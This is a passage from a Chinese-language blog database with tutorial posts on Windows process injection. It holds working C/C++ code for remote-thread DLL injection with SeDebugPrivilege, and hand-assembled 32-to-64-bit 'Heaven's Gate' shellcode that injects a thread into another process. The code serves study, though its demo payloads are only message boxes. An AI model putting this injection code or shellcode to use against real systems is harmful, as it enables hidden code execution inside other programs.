dwExitCode;\n\tGetExitCodeThread(m_hInjecthread, &dwExitCode);\n\tHMODULE m_hMod = (HMODULE)dwExitCode;\n\n\t//7. 释放空间\n\tBOOL bReturn = VirtualFreeEx(hProcess, pszDllName, \n\t\t4096, MEM_DECOMMIT);\n\n\tif (NULL == bReturn)\n\t{\n\t\treturn -1;\n\t}\n\n\tCloseHandle(hProcess);\n\thProcess = NULL;\n\t//恢复权限相关操作\n\tEnablePrivilege(FALSE);\n\n\treturn 0;\n}\nint EnablePrivilege(bool isStart)\n{        \n\t//1. 得到令牌句柄\n\tHANDLE  hToken = NULL;      //令牌句柄  \n\tif (!OpenProcessToken( GetCurrentProcess(), \n\t\tTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ, \n\t\t&hToken))\n\t{   \n\t\treturn FALSE;\n\t}\n\n\t//2. 得到特权值\n\tLUID    luid = {0};         //特权值\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))\n\t{\n\t\treturn FALSE;\n\t}\n\t//3. 提升令牌句柄权限\n\tTOKEN_PRIVILEGES tp = {0};  //令牌新权限\n\ttp.PrivilegeCount = 1; \n\ttp.Privileges[0].Luid = luid;\n\ttp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL))\n\t{\n\t\treturn FALSE;\n\t}\n\t//4. 关闭令牌句柄\n\tCloseHandle(hToken);\n\treturn 0;\n}\nDWORD GetProcessId(PTCHAR pszProcessName)\n{\n\tHANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID\n\n\tif (INVALID_HANDLE_VALUE == hProcess)\n\t{\n\t\treturn 0;\n\t}\n\n\tDWORD dwProcessId = 0;\n\n\tPROCESSENTRY32 process32 = {0};\n\tprocess32.dwSize = sizeof(PROCESSENTRY32);\n\n\tBOOL bRetProcess = FALSE;\n\tbRetProcess = Process32First(hProcess, &process32);\n\n\tdo\n\t{\n\t\tif (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID\n\t\t{\n\t\t\tdwProcessId = process32.th32ProcessID;\n\t\t\tbreak;\n\t\t}\n\n\t\tbRetProcess = Process32Next(hProcess, &process32);\n\t}while (bRetProcess);\n\tCloseHandle(hProcess);\n\n\treturn dwProcessId;\n}\n\n\n```\n","slug":"远线程注入","published":1,"updated":"2019-12-17T02:22:24.856Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c002iccuq7kj6px1k","content":"<h3 id=\"什么是远线程注入\"><a href=\"#什么是远线程注入\" class=\"headerlink\" title=\"什么是远线程注入\"></a>什么是远线程注入</h3><p>在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。</p>\n<h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><p>下面例子是根据查询一打开窗口中的计算器进程，然后<br><img src=\"https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>注释都很详细 </p>\n<pre><code class=\"c\">#include &quot;windows.h&quot;\n#include &quot;Tlhelp32.h&quot;\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName);\nint EnablePrivilege(bool isStart);\nDWORD GetProcessId(PTCHAR pszProcessName);\n\nvoid main()\n{\n    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\\\目标程序\n    InjectDll(ProcessId ,&quot;C:\\\\Users\\\\sam\\\\Desktop\\\\A.dll&quot;);\\\\注入dll的地址\n}\n\n\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName)\n{\n    if (szDllName[0] == NULL)\n        return -1;\n    //提高权限相关操作\n    EnablePrivilege(TRUE);\n    //1. 打开进程\n    HANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限\n        FALSE,                                              //是否可继承 \n        dwProcessId);                                       //进程ID\n\n    if (hProcess == INVALID_HANDLE_VALUE)\n        return -1;\n\n    //2. 在远程进程中申请空间\n    LPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄\n        NULL,                                  //建议开始地址\n        4096,                                  //分配空间大小\n        MEM_COMMIT,                            //空间初始化全0\n        PAGE_EXECUTE_READWRITE);               //空间权限\n\n    if (NULL == pszDllName)\n    {\n        return -1;\n    }\n\n    //3. 向远程进程中写入数据\n    BOOL bRet = WriteProcessMemory( hProcess, pszDllName, \n        szDllName, MAX_PATH, NULL);\n\n    if (NULL == bRet)\n    {\n        return -1;\n    }\n\n    //4. 在远程进程中创建远程线程\n    HANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄\n    NULL,                                            //安全属性\n    0,                                               //栈大小\n    (LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数    \n    pszDllName,                                      //传入参数\n    NULL,                                            //默认创建后的状态\n    NULL);                                           //线程ID\n\n    if (NULL == m_hInjecthread)\n    {\n        DWORD dwErr = GetLastError();\n        return -1;\n    }\n\n    //5. 等待线程结束返回\n    DWORD dw = WaitForSingleObject(m_hInjecthread, -1);\n    //6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址\n    DWORD dwExitCode;\n    GetExitCodeThread(m_hInjecthread, &amp;dwExitCode);\n    HMODULE m_hMod = (HMODULE)dwExitCode;\n\n    //7. 释放空间\n    BOOL bReturn = VirtualFreeEx(hProcess, pszDllName, \n        4096, MEM_DECOMMIT);\n\n    if (NULL == bReturn)\n    {\n        return -1;\n    }\n\n    CloseHandle(hProcess);\n    hProcess = NULL;\n    //恢复权限相关操作\n    EnablePrivilege(FALSE);\n\n    return 0;\n}\nint EnablePrivilege(bool isStart)\n{        \n    //1. 得到令牌句柄\n    HANDLE  hToken = NULL;      //令牌句柄  \n    if (!OpenProcessToken( GetCurrentProcess(), \n        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ, \n        &amp;hToken))\n    {   \n        return FALSE;\n    }\n\n    //2. 得到特权值\n    LUID    luid = {0};         //特权值\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))\n    {\n        return FALSE;\n    }\n    //3. 提升令牌句柄权限\n    TOKEN_PRIVILEGES tp = {0};  //令牌新权限\n    tp.PrivilegeCount = 1; \n    tp.Privileges[0].Luid = luid;\n    tp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL))\n    {\n        return FALSE;\n    }\n    //4. 关闭令牌句柄\n    CloseHandle(hToken);\n    return 0;\n}\nDWORD GetProcessId(PTCHAR pszProcessName)\n{\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID\n\n    if (INVALID_HANDLE_VALUE == hProcess)\n    {\n        return 0;\n    }\n\n    DWORD dwProcessId = 0;\n\n    PROCESSENTRY32 process32 = {0};\n    process32.dwSize = sizeof(PROCESSENTRY32);\n\n    BOOL bRetProcess = FALSE;\n    bRetProcess = Process32First(hProcess, &amp;process32);\n\n    do\n    {\n        if (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID\n        {\n            dwProcessId = process32.th32ProcessID;\n            break;\n        }\n\n        bRetProcess = Process32Next(hProcess, &amp;process32);\n    }while (bRetProcess);\n    CloseHandle(hProcess);\n\n    return dwProcessId;\n}\n\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"什么是远线程注入\"><a href=\"#什么是远线程注入\" class=\"headerlink\" title=\"什么是远线程注入\"></a>什么是远线程注入</h3><p>在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。</p>\n<h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><p>下面例子是根据查询一打开窗口中的计算器进程，然后<br><img src=\"https://img-blog.csdnimg.cn/20190826100826723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>注释都很详细 </p>\n<pre><code class=\"c\">#include &quot;windows.h&quot;\n#include &quot;Tlhelp32.h&quot;\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName);\nint EnablePrivilege(bool isStart);\nDWORD GetProcessId(PTCHAR pszProcessName);\n\nvoid main()\n{\n    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\\\目标程序\n    InjectDll(ProcessId ,&quot;C:\\\\Users\\\\sam\\\\Desktop\\\\A.dll&quot;);\\\\注入dll的地址\n}\n\n\nint InjectDll(DWORD dwProcessId, PTCHAR szDllName)\n{\n    if (szDllName[0] == NULL)\n        return -1;\n    //提高权限相关操作\n    EnablePrivilege(TRUE);\n    //1. 打开进程\n    HANDLE hProcess = OpenProcess(  PROCESS_ALL_ACCESS,   //打开进程权限\n        FALSE,                                              //是否可继承 \n        dwProcessId);                                       //进程ID\n\n    if (hProcess == INVALID_HANDLE_VALUE)\n        return -1;\n\n    //2. 在远程进程中申请空间\n    LPVOID pszDllName = VirtualAllocEx(hProcess, //远程进程句柄\n        NULL,                                  //建议开始地址\n        4096,                                  //分配空间大小\n        MEM_COMMIT,                            //空间初始化全0\n        PAGE_EXECUTE_READWRITE);               //空间权限\n\n    if (NULL == pszDllName)\n    {\n        return -1;\n    }\n\n    //3. 向远程进程中写入数据\n    BOOL bRet = WriteProcessMemory( hProcess, pszDllName, \n        szDllName, MAX_PATH, NULL);\n\n    if (NULL == bRet)\n    {\n        return -1;\n    }\n\n    //4. 在远程进程中创建远程线程\n    HANDLE m_hInjecthread = CreateRemoteThread(hProcess,      //远程进程句柄\n    NULL,                                            //安全属性\n    0,                                               //栈大小\n    (LPTHREAD_START_ROUTINE)LoadLibrary,             //进程处理函数    \n    pszDllName,                                      //传入参数\n    NULL,                                            //默认创建后的状态\n    NULL);                                           //线程ID\n\n    if (NULL == m_hInjecthread)\n    {\n        DWORD dwErr = GetLastError();\n        return -1;\n    }\n\n    //5. 等待线程结束返回\n    DWORD dw = WaitForSingleObject(m_hInjecthread, -1);\n    //6. 获取线程退出码,即LoadLibrary的返回值，即dll的首地址\n    DWORD dwExitCode;\n    GetExitCodeThread(m_hInjecthread, &amp;dwExitCode);\n    HMODULE m_hMod = (HMODULE)dwExitCode;\n\n    //7. 释放空间\n    BOOL bReturn = VirtualFreeEx(hProcess, pszDllName, \n        4096, MEM_DECOMMIT);\n\n    if (NULL == bReturn)\n    {\n        return -1;\n    }\n\n    CloseHandle(hProcess);\n    hProcess = NULL;\n    //恢复权限相关操作\n    EnablePrivilege(FALSE);\n\n    return 0;\n}\nint EnablePrivilege(bool isStart)\n{        \n    //1. 得到令牌句柄\n    HANDLE  hToken = NULL;      //令牌句柄  \n    if (!OpenProcessToken( GetCurrentProcess(), \n        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_READ, \n        &amp;hToken))\n    {   \n        return FALSE;\n    }\n\n    //2. 得到特权值\n    LUID    luid = {0};         //特权值\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))\n    {\n        return FALSE;\n    }\n    //3. 提升令牌句柄权限\n    TOKEN_PRIVILEGES tp = {0};  //令牌新权限\n    tp.PrivilegeCount = 1; \n    tp.Privileges[0].Luid = luid;\n    tp.Privileges[0].Attributes = isStart ? SE_PRIVILEGE_ENABLED : 0;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL))\n    {\n        return FALSE;\n    }\n    //4. 关闭令牌句柄\n    CloseHandle(hToken);\n    return 0;\n}\nDWORD GetProcessId(PTCHAR pszProcessName)\n{\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取当前系统的快照，这种方法能拿到想要的进程ID\n\n    if (INVALID_HANDLE_VALUE == hProcess)\n    {\n        return 0;\n    }\n\n    DWORD dwProcessId = 0;\n\n    PROCESSENTRY32 process32 = {0};\n    process32.dwSize = sizeof(PROCESSENTRY32);\n\n    BOOL bRetProcess = FALSE;\n    bRetProcess = Process32First(hProcess, &amp;process32);\n\n    do\n    {\n        if (strcmp(pszProcessName, process32.szExeFile) == 0)//名称对上，获取其进程ID\n        {\n            dwProcessId = process32.th32ProcessID;\n            break;\n        }\n\n        bRetProcess = Process32Next(hProcess, &amp;process32);\n    }while (bRetProcess);\n    CloseHandle(hProcess);\n\n    return dwProcessId;\n}\n\n</code></pre>\n"},{"title":"32->64注入shellcode","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg","_content":"\n## 远进程注入\n\n[注入参考——必看](https://www.cnblogs.com/uAreKongqi/p/6012353.html)\n\n### 32位->32位 \n\n核心思路如下\n\n- 根据进程ID打开进程，获得进程句柄\n- 申请内存空间\n- 写入数据\n- 将内存改为可读可执行(可选)\n- 创建线程\n- 等待线程退出(可选)\n\n**使用到的API**\n\n- OpenProcess\n- VirtualAllocEx\n- WriteProcessMemory\n- VirtualProtectEx\n- CreateRemoteThread\n- WaitForSingleObject\n\n注入模板网上都有。这里贴一下注入函数且带有参数的写法\n\n```c++\n#pragma once  \n#include <windows.h>  \n#include <TlHelp32.h>  \n#include \"stdio.h\"\n\ntypedef struct _RemoteParam {\n\tchar szMsg[12];    //MessageBox函数中显示的字符提示  \n\tDWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\n\n//定义MessageBox类型的函数指针  \ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n\tRemoteParam* pRP = (RemoteParam*)lParam;\n\tPFN_MESSAGEBOX pfnMessageBox;\n\tpfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;\n\tpfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);\n\treturn 0;\n}\n\nbool enableDebugPriv()\n{\n\tHANDLE hToken;\n\tLUID sedebugnameValue;\n\tTOKEN_PRIVILEGES tkp;\n\tif (!OpenProcessToken(GetCurrentProcess(),\n\t\tTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {\n\t\treturn false;\n\t}\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\ttkp.PrivilegeCount = 1;\n\ttkp.Privileges[0].Luid = sedebugnameValue;\n\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\treturn true;\n}\n\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 pe;\n\tpe.dwSize = sizeof(PROCESSENTRY32);\n\tif (!Process32First(hSnapshot, &pe)) {\n\t\tMessageBoxA(NULL,\n\t\t\t\"The frist entry of the process list has not been copyied to the buffer\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\twhile (Process32Next(hSnapshot, &pe)) {\n\t\tif (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n\t\t\treturn OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n\t\t}\n\t}\n\treturn 0;\n}\n\nint _main()\n{\n\tconst DWORD dwThreadSize = 4096;\n\tDWORD dwWriteBytes = 0;\n\tenableDebugPriv();\n\tHANDLE TargetProc = GetProcessHandleByName(L\"CheckVm.exe\");\n\tif (!TargetProc)\n\t{\n\t\tMessageBoxA(NULL,\n\t\t\t\"Open target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//在宿主进程中为线程体开辟一块存储区域  \n\t//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n\t//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\tdwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tif (!pRemoteThread) {\n\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//将线程体拷贝到宿主进程中  \n\tif (!WriteProcessMemory(TargetProc,\n\t\tpRemoteThread, &threadProc, dwThreadSize, 0)) {\n\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\t//定义线程参数结构体变量  \n\tRemoteParam remoteData;\n\tZeroMemory(&remoteData, sizeof(RemoteParam));\n\n\t//填充结构体变量中的成员  \n\tHINSTANCE hUser32 = LoadLibrary(L\"User32.dll\");\n\tremoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, \"MessageBoxA\");\n\tstrcat_s(remoteData.szMsg, \"Hello＼0\");\n\n\t//为线程参数在宿主进程中开辟存储区域  \n\tRemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n\t\tTargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n\tif (!pRemoteParam) {\n\t\tMessageBoxA(NULL, \"Alloc memory failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\t//将线程参数拷贝到宿主进程地址空间中  \n\tif (!WriteProcessMemory(TargetProc,\n\t\tpRemoteParam, &remoteData, sizeof(remoteData), 0)) {\n\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\t//在宿主进程中创建线程  \n\tHANDLE hRemoteThread = CreateRemoteThread(\n\t\tTargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n\t\tpRemoteParam, 0, &dwWriteBytes);\n\tif (!hRemoteThread) {\n\t\tMessageBoxA(NULL, \"Create remote thread failed !\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\tCloseHandle(hRemoteThread);\n\tFreeLibrary(hUser32);\n\treturn 0;\n}\n```\n\n\n\n### 32位->64位\n\n\n\n核心思路如下\n\n- 根据进程ID打开进程，获得进程句柄\n- 申请内存空间\n- 写入数据\n- 将内存改为可读可执行(可选)\n- 创建线程\n- 等待线程退出(可选)\n\n**使用到的API**\n\n- OpenProcess\n- VirtualAllocEx\n- WriteProcessMemory\n- VirtualProtectEx\n- **CreateRemoteThread64**\n- WaitForSingleObject\n\n32位去注入64位进程时`CreateRemoteThread`会调用失败，需要使用64位的接口\n\n先提升到64位汇编，在遍历ntdll.dll中的导出函数 `CreateRemoteThread`\n\n\n\n## 笔记\n\n[32位注入64位参考](https://www.cnblogs.com/HsinTsao/p/7270732.html)\n\n3g大佬代码代码有点问题，有点误导\n\n获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的\n\n>  在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，**CS = 0x23**；64位模式时，**CS = 0x33**。\n>\n> 这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令\n>\n> `pop ip`\n>\n> `pop cs`\n\n\n\n代码中`CREATETHREADPIC`shellcode是用来得到64位的`CreateRemoteThread`\n\n`EXECPIC`是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码\n\n```c++\n#pragma once  \n#include <windows.h>  \n#include <TlHelp32.h>  \n#include <iostream>\nusing namespace std;\n\n#define CREATETHREADPIC_SIZE 271\nchar CREATETHREADPIC[] = {\n\t/* 0000 */ \"\\x53\"                             /* push ebx                    */\n\t/* 0001 */ \"\\x56\"                             /* push esi                    */\n\t/* 0002 */ \"\\x57\"                             /* push edi                    */\n\t/* 0003 */ \"\\x55\"                             /* push ebp                    */\n\t/* 0004 */ \"\\xe8\\x6c\\x00\\x00\\x00\"             /* call 0x75                   */\n\t/* 0009 */ \"\\x85\\xc0\"                         /* test eax, eax               */\n\t/* 000B */ \"\\x74\\x5d\"                         /* jz 0x6a                     */\n\t/* 000D */ \"\\x48\\x89\\xe6\"                     /* mov rsi, rsp                */\n\t/* 0010 */ \"\\x48\\x83\\xe4\\xf0\"                 /* and rsp, 0xfffffffffffffff0 */\n\t/* 0014 */ \"\\x48\\x83\\xec\\x68\"                 /* sub rsp, 0x68               */\n\t/* 0018 */ \"\\xb8\\xfa\\x80\\x39\\x5e\"             /* mov eax, 0x5e3980fa         */\n\t/* 001D */ \"\\xe8\\x78\\x00\\x00\\x00\"             /* call 0x9a                   */\n\t/* 0022 */ \"\\x48\\x89\\xc3\"                     /* mov rbx, rax                */\n\t/* 0025 */ \"\\x4d\\x31\\xc0\"                     /* xor r8, r8                  */\n\t/* 0028 */ \"\\x48\\x31\\xc0\"                     /* xor rax, rax                */\n\t/* 002B */ \"\\x48\\x89\\x44\\x24\\x50\"             /* mov [rsp+0x50], rax         */\n\t/* 0030 */ \"\\x48\\x89\\x44\\x24\\x48\"             /* mov [rsp+0x48], rax         */\n\t/* 0035 */ \"\\x48\\x89\\x44\\x24\\x40\"             /* mov [rsp+0x40], rax         */\n\t/* 003A */ \"\\x48\\x89\\x44\\x24\\x38\"             /* mov [rsp+0x38], rax         */\n\t/* 003F */ \"\\x48\\x89\\x44\\x24\\x30\"             /* mov [rsp+0x30], rax         */\n\t/* 0044 */ \"\\x8b\\x46\\x24\"                     /* mov eax, [rsi+0x24]         */\n\t/* 0047 */ \"\\x48\\x89\\x44\\x24\\x28\"             /* mov [rsp+0x28], rax         */\n\t/* 004C */ \"\\x8b\\x46\\x20\"                     /* mov eax, [rsi+0x20]         */\n\t/* 004F */ \"\\x48\\x89\\x44\\x24\\x20\"             /* mov [rsp+0x20], rax         */\n\t/* 0054 */ \"\\x44\\x8b\\x4e\\x14\"                 /* mov r9d, [rsi+0x14]         */\n\t/* 0058 */ \"\\xba\\x00\\x00\\x00\\x10\"             /* mov edx, 0x10000000         */\n\t/* 005D */ \"\\x8b\\x4e\\x30\"                     /* mov ecx, [rsi+0x30]         */\n\t/* 0060 */ \"\\xff\\xd3\"                         /* call rbx                    */\n\t/* 0062 */ \"\\x48\\x89\\xf4\"                     /* mov rsp, rsi                */\n\t/* 0065 */ \"\\xe8\\x18\\x00\\x00\\x00\"             /* call 0x82                   */\n\t/* 006A */ \"\\x5d\"                             /* pop rbp                     */\n\t/* 006B */ \"\\x5f\"                             /* pop rdi                     */\n\t/* 006C */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 006D */ \"\\x5b\"                             /* pop rbx                     */\n\t/* 006E */ \"\\xc3\"                             /* ret                         */\n\t/* 006F */ \"\\x31\\xc0\"                         /* xor eax, eax                */\n\t/* 0071 */ \"\\x48\\xf7\\xd8\"                     /* neg eax                     */\n\t/* 0074 */ \"\\xc3\"                             /* ret                         */\n\t/* 0075 */ \"\\xe8\\xf5\\xff\\xff\\xff\"             /* call 0x6f                   */\n\t/* 007A */ \"\\x74\\x05\"                         /* jz 0x81                     */\n\t/* 007C */ \"\\x58\"                             /* pop eax                     */\n\t/* 007D */ \"\\x6a\\x33\"                         /* push 0x33                   */ //将cs修改为0x33\n\t/* 007F */ \"\\x50\"                             /* push eax                    */ //也就能执行64位汇编了\n\t/* 0080 */ \"\\xcb\"                             /* retf                        */\n\t/* 0081 */ \"\\xc3\"                             /* ret                         */\n\t/* 0082 */ \"\\xe8\\xe8\\xff\\xff\\xff\"             /* call 0x6f                   */\n\t/* 0087 */ \"\\x75\\x10\"                         /* jnz 0x99                    */\n\t/* 0089 */ \"\\x58\"                             /* pop rax                     */\n\t/* 008A */ \"\\x83\\xec\\x08\"                     /* sub esp, 0x8                */\n\t/* 008D */ \"\\x89\\x04\\x24\"                     /* mov [rsp], eax              */\n\t/* 0090 */ \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" /* mov dword [rsp+0x4], 0x23   */\n\t/* 0098 */ \"\\xcb\"                             /* retf                        */\n\t/* 0099 */ \"\\xc3\"                             /* ret                         */\n\t/* 009A */ \"\\x56\"                             /* push rsi                    */\n\t/* 009B */ \"\\x57\"                             /* push rdi                    */\n\t/* 009C */ \"\\x53\"                             /* push rbx                    */\n\t/* 009D */ \"\\x51\"                             /* push rcx                    */\n\t/* 009E */ \"\\x49\\x89\\xc0\"                     /* mov r8, rax                 */\n\t/* 00A1 */ \"\\x6a\\x60\"                         /* push 0x60                   */\n\t/* 00A3 */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 00A4 */ \"\\x65\\x48\\x8b\\x06\"                 /* mov rax, [gs:rsi]           */\n\t/* 00A8 */ \"\\x48\\x8b\\x40\\x18\"                 /* mov rax, [rax+0x18]         */\n\t/* 00AC */ \"\\x4c\\x8b\\x50\\x30\"                 /* mov r10, [rax+0x30]         */\n\t/* 00B0 */ \"\\x49\\x8b\\x6a\\x10\"                 /* mov rbp, [r10+0x10]         */\n\t/* 00B4 */ \"\\x48\\x85\\xed\"                     /* test rbp, rbp               */\n\t/* 00B7 */ \"\\x89\\xe8\"                         /* mov eax, ebp                */\n\t/* 00B9 */ \"\\x74\\x4f\"                         /* jz 0x10a                    */\n\t/* 00BB */ \"\\x4d\\x8b\\x12\"                     /* mov r10, [r10]              */\n\t/* 00BE */ \"\\x8b\\x45\\x3c\"                     /* mov eax, [rbp+0x3c]         */\n\t/* 00C1 */ \"\\x83\\xc0\\x10\"                     /* add eax, 0x10               */\n\t/* 00C4 */ \"\\x8b\\x44\\x05\\x78\"                 /* mov eax, [rbp+rax+0x78]     */\n\t/* 00C8 */ \"\\x48\\x8d\\x74\\x05\\x18\"             /* lea rsi, [rbp+rax+0x18]     */\n\t/* 00CD */ \"\\xad\"                             /* lodsd                       */\n\t/* 00CE */ \"\\x91\"                             /* xchg ecx, eax               */\n\t/* 00CF */ \"\\x67\\xe3\\xde\"                     /* jecxz 0xb0                  */\n\t/* 00D2 */ \"\\xad\"                             /* lodsd                       */\n\t/* 00D3 */ \"\\x4c\\x8d\\x5c\\x05\\x00\"             /* lea r11, [rbp+rax]          */\n\t/* 00D8 */ \"\\xad\"                             /* lodsd                       */\n\t/* 00D9 */ \"\\x48\\x8d\\x7c\\x05\\x00\"             /* lea rdi, [rbp+rax]          */\n\t/* 00DE */ \"\\xad\"                             /* lodsd                       */\n\t/* 00DF */ \"\\x48\\x8d\\x5c\\x05\\x00\"             /* lea rbx, [rbp+rax]          */\n\t/* 00E4 */ \"\\x8b\\x74\\x8f\\xfc\"                 /* mov esi, [rdi+rcx*4-0x4]    */\n\t/* 00E8 */ \"\\x48\\x01\\xee\"                     /* add rsi, rbp                */\n\t/* 00EB */ \"\\x31\\xc0\"                         /* xor eax, eax                */\n\t/* 00ED */ \"\\x99\"                             /* cdq                         */\n\t/* 00EE */ \"\\xac\"                             /* lodsb                       */\n\t/* 00EF */ \"\\x01\\xc2\"                         /* add edx, eax                */\n\t/* 00F1 */ \"\\xc1\\xc2\\x05\"                     /* rol edx, 0x5                */\n\t/* 00F4 */ \"\\xff\\xc8\"                         /* dec eax                     */\n\t/* 00F6 */ \"\\x79\\xf6\"                         /* jns 0xee                    */\n\t/* 00F8 */ \"\\x44\\x39\\xc2\"                     /* cmp edx, r8d                */\n\t/* 00FB */ \"\\xe0\\xe7\"                         /* loopne 0xe4                 */\n\t/* 00FD */ \"\\x75\\xb1\"                         /* jnz 0xb0                    */\n\t/* 00FF */ \"\\x0f\\xb7\\x14\\x4b\"                 /* movzx edx, word [rbx+rcx*2] */\n\t/* 0103 */ \"\\x41\\x8b\\x04\\x93\"                 /* mov eax, [r11+rdx*4]        */\n\t/* 0107 */ \"\\x48\\x01\\xe8\"                     /* add rax, rbp                */\n\t/* 010A */ \"\\x59\"                             /* pop rcx                     */\n\t/* 010B */ \"\\x5b\"                             /* pop rbx                     */\n\t/* 010C */ \"\\x5f\"                             /* pop rdi                     */\n\t/* 010D */ \"\\x5e\"                             /* pop rsi                     */\n\t/* 010E */ \"\\xc3\"                             /* ret                         */\n};\n#define EXECPIC_SIZE 1984\nchar EXECPIC[] = {\n\t/* 0000 */ \"\\x48\\x81\\xec\\xd8\\x00\\x00\\x00\"                     /* sub rsp, 0xd8                            */\n\t/* 0007 */ \"\\x48\\xc7\\x44\\x24\\x78\\x00\\x00\\x00\\x00\"             /* mov qword [rsp+0x78], 0x0                */\n\t/* 0010 */ 